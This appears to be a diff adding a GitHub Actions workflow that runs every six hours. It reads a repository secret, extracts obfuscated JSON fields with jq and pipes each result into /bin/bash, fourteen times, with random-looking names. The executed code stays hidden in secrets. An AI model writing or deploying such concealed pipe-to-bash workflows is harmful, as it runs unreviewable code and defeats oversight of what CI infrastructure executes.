@@ -1,0 +1,30 @@
+name: weijunxianjie
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: weijunxianjie
+        env:
+          tn32155: ${{ secrets.tn32155 }}
+        run: |
+          echo $tn32155 | jq -r .gndg46680 | /bin/bash
+          echo $t79116 | jq -r .rlus70 | /bin/bash
+          echo $weron069 | jq -r .ned1 | /bin/bash
+          echo $zfwfr26 | jq -r .o99 | /bin/bash
+          echo $lwrwj1 | jq -r .iywn5 | /bin/bash
+          echo $h5175 | jq -r .xw61 | /bin/bash
+          echo $onnpv5 | jq -r .twrjf819 | /bin/bash
+          echo $th38 | jq -r .kpxi878 | /bin/bash
+          echo $lmki6789 | jq -r .o040 | /bin/bash
+          echo $wehq49489 | jq -r .zbeeo58733 | /bin/bash
+          echo $n6 | jq -r .ekx0874 | /bin/bash
+          echo $eo9 | jq -r .eo4 | /bin/bash
+          echo $h1871 | jq -r .nac34 | /bin/bash
+          echo $zavbm87 | jq -r .ehlj41424 | /bin/bash
+
